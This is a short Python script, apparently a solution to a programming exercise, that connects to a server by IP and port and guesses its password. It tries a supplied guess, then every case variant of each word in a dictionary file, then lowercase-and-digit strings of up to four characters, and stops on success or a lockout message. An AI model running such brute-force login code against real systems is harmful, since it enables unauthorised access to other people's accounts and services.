# write your code here
import socket
import sys
import itertools
import string

success = False
blocked = False


def brute_force():
    global success, blocked

    for length in range(1, 5):

        symbols = itertools.chain(string.ascii_lowercase, string.digits)
        permutations = itertools.product(symbols, repeat=length)

        for permutation in permutations:

            password = ''.join(permutation)

            success, blocked = try_password(password)

            if success or blocked:
                return success, blocked

    return success, blocked


def try_dictionary(file_path):
    global success, blocked

    with open(file_path, "r") as pw_file:
        for line in pw_file:
            permute_case_and_test(list(line.strip()), 0)

    return success, blocked


def permute_case_and_test(char_list, permutation_index):
    global success, blocked

    char_list[permutation_index] = char_list[permutation_index].lower()

    if permutation_index == len(char_list) - 1:
        success, blocked = try_password("".join(char_list))

        if success or blocked:
            return success, blocked
    else:
        permute_case_and_test(char_list, permutation_index + 1)

    char_list[permutation_index] = char_list[permutation_index].upper()

    if permutation_index == len(char_list) - 1:
        success, blocked = try_password("".join(char_list))

        if success or blocked:
            return success, blocked
    else:
        permute_case_and_test(char_list, permutation_index + 1)

    return success, blocked


def try_password(password):
    global success, blocked, client_socket

    client_socket.send(password.encode())
    response = client_socket.recv(1024).decode()

    if response == "Connection success!":
        success = True
        print(password)
    elif response == "Too many attempts":
        blocked = True

    return success, blocked


# run program
if len(sys.argv) < 3:
    print("illegal parameters")
else:
    ip_address = sys.argv[1]
    port = int(sys.argv[2])
    if len(sys.argv) == 4:
        password_guess = sys.argv[3]
    else:
        password_guess = None
    with socket.socket() as client_socket:
        try:
            # print(ip_address, port)
            client_socket.connect((ip_address, port))

            if password_guess:
                success, blocked = try_password(password_guess)
            if not (success or blocked):
                success, blocked = try_dictionary(".\\hacking\\passwords.txt")
            if not (success or blocked):
                success, blocked = brute_force()

        except ConnectionError:
            print("Connection Error")
